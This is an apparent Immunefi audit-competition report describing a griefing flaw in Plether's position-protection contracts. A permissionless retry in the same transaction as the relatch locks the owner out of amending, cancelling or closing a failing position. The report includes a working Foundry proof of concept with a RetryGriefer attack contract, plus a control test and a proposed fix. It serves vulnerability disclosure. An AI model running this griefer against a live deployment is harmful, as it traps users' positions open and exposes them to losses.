# \#99828 [SC-High] Permissionless retry in the same transaction as the relatch removes the owner's only amend window, locking a failing protected position open

**Submitted on Nov 15th 2026 at 12:37:08 UTC by @slowpoke for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99828
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

Brief / Intro

When a triggered protection's child close fails with a typed constraint, the protection relatches. The owner's only remedy is to amend the close limits, and that is allowed only while the protection is Latched. retryPositionProtectionClose is permissionless, so anyone can execute the failing child and retry it in the same transaction. The protection goes straight back to Triggered with the same failing limits, and the owner never sees a Latched state.

While Triggered, the owner can't amend, cancel or manually close. The PoC repeats the cycle five times, and every owner exit reverts each time. In the control, nobody retries first, so the owner amends while the protection is Latched and the retry closes the position.

Vulnerability details

1. Amending requires Latched. PositionProtectionBook.amendLatchedPositionProtectionCloseLimits (L315–325) reverts ProtectionNotLatched unless the status is Latched and the account has no pending orders.

2. Retry is open to anyone and changes nothing. retryPositionProtectionClose (L382–406):

solidity
StoredProtection storage protection = _activeProtection(protectionId);   // no owner check
if (protection.status != Latched) revert OrderRouter__ProtectionNotLatched();
...
linkedOrderId = commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);

It has no caller check, no cooldown and no threshold re-check. It moves the protection from Latched back to Triggered with the same stored limits.

3. The relatch and the retry can be atomic. handleFailedProtectionAttempt (L637) relatches inside the executor's transaction, so execute → relatch → retry fits in one call.

4. Every other exit is closed while Triggered.

_cancel (L408–418) and cancelPositionProtectionAndCommitClose (L341–347) accept only PendingOpen/Armed and revert ProtectionNotArmed.
commitOrder for a manual close reverts OrderRouter__ProtectionActive (OrderLiquidationBatchLogic L314).

SECURITY.md (L547–552) documents that triggering is irreversible and that retry is permissionless. It does not say that retry can pre-empt the owner's amend remedy.

Impact details
Position locked open. The owner can't fix the limits, cancel or close, so the position stays exposed to carry, price risk and liquidation while the child keeps failing.
Easy to trigger. It takes any caller with one helper contract (execute + retry). Even an honest keeper that retries promptly has the same effect.
No profit motive. Protection attempts carry zero bounty, so this is pure griefing.
PoC (LONG, stop loss with the notional cap below the fill)	Owner amend	Cancel	Manual close	Position
Atomic execute + retry, 5 cycles (bug)	reverts NotLatched	reverts NotArmed	reverts ProtectionActive	stays open
No same-transaction retry (control)	succeeds	—	—	closed

Limits:

The owner can still win the race by executing or expiring the child and amending in one batched transaction, using a smart account or EIP-7702.
Failure depends on price: the child fills once the price comes back inside the owner's limits.
The griefer earns nothing.

Fix: add an owner-only amendAndRetry, or reserve a short owner-only window after each relatch before permissionless retry opens.

References
packages/perps/src/PositionProtectionBook.sol L315–325 (amend), L341–347 (cancel and close), L382–406 (retry), L408–418 (_cancel), L637 (handleFailedProtectionAttempt)
packages/perps/src/router/OrderLiquidationBatchLogic.sol L314 (ProtectionActive)
packages/perps/SECURITY.md L547–552

## Proof of Concept

// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "../spec/trader/PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

interface IRouterExecute {

    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory result);

}

/// @dev Unprivileged caller: executes the failing child (which relatches the protection) and retries it in ONE
///      transaction, so the owner never observes `Latched` with an empty queue, the only state in which
///      `amendLatchedPositionProtectionCloseLimits` succeeds.
contract RetryGriefer {

    function cycle(
        address router,
        IPositionProtectionActions book,
        uint64 protectionId,
        uint64 liveChildId,
        bytes[] calldata pythUpdateData
    ) external returns (uint64 nextChildId) {
        IRouterExecute(router).executeOrder(liveChildId, pythUpdateData);
        nextChildId = book.retryPositionProtectionClose(protectionId);
    }

}

/// @notice Finding D PoC: a permissionless retry in the same transaction as the relatch removes the owner's only
///         remedy (amend) for a protection whose child close keeps failing. The owner can neither amend, cancel
///         nor manually close the position.
///         Run: forge test --match-contract ProtectionRetryPreemptsAmendPoC -vv
contract ProtectionRetryPreemptsAmendPoC is PositionProtectionTest {

    /// @dev Unique Pyth tick strictly inside the child's historical window (commitTime, commitTime + window].
    function _execData(
        uint64 childId,
        uint256 price
    ) internal returns (bytes[] memory) {
        uint64 commitTime = router.lifecycleBook().orderTiming(childId).commitTimestamp;
        vm.warp(uint256(commitTime) + 2);
        vm.roll(vm.getBlockNumber() + 1);
        return _mockUniquePythUpdateDataAt(price, commitTime + 1, commitTime);
    }

    /// @dev LONG position (profits when the basket falls) with a stop loss above entry. The notional ceiling equals
    ///      the entry notional, so every stop-loss fill (at a higher price) exceeds it and the child fails with a
    ///      typed constraint violation.
    function _openWithFailingProtection() internal returns (uint64 protectionId) {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, LONG_STOP_LOSS);
        params.closeLimits.maxExecutionNotionalAssets = (POSITION_SIZE * MARK_PRICE) / 1e20;
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);
    }

    function test_D_RetryRaceLocksOwnerOutOfAmendCancelAndManualClose() public {
        uint64 protectionId = _openWithFailingProtection();
        uint64 child = _triggerAt(protectionId, LONG_STOP_LOSS);
        RetryGriefer griefer = new RetryGriefer();
        PositionProtectionTypes.CloseFinancialLimits memory fixedLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });

        for (uint256 i; i < 5; ++i) {
            // The owner tries every exit while a child is live.
            vm.startPrank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, fixedLimits);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
            protectionActions.cancelPositionProtection(protectionId);
            vm.stopPrank();
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
            router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, 0, true);

            // Anyone: execute the failing child (typed constraint -> relatch) and retry it atomically.
            bytes[] memory data = _execData(child, LONG_STOP_LOSS);
            child = griefer.cycle(address(router), protectionActions, protectionId, child, data);

            assertEq(
                uint8(protectionViews.getPositionProtection(protectionId).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
                "owner never observes Latched with an empty queue"
            );
            (uint256 size,,,,,,) = engine.positions(ALICE);
            assertEq(size, POSITION_SIZE, "position stays open");
        }
        emit log_named_uint("griefer cycles completed, owner amend attempts reverted", 5);
    }

    /// Control: with no same-transaction retry, the owner's remedy works (amend while Latched, then retry closes).
    function test_D_Control_OwnerAmendWorksWhenNobodyRetriesFirst() public {
        uint64 protectionId = _openWithFailingProtection();
        uint64 child = _triggerAt(protectionId, LONG_STOP_LOSS);

        bytes[] memory firstData = _execData(child, LONG_STOP_LOSS);
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(child, firstData);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "failing child relatches"
        );
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _params(0, LONG_STOP_LOSS).closeLimits);
        child = protectionActions.retryPositionProtectionClose(protectionId);
        bytes[] memory retryData = _execData(child, LONG_STOP_LOSS);
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(child, retryData);
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "amended retry closes the position");
    }

}

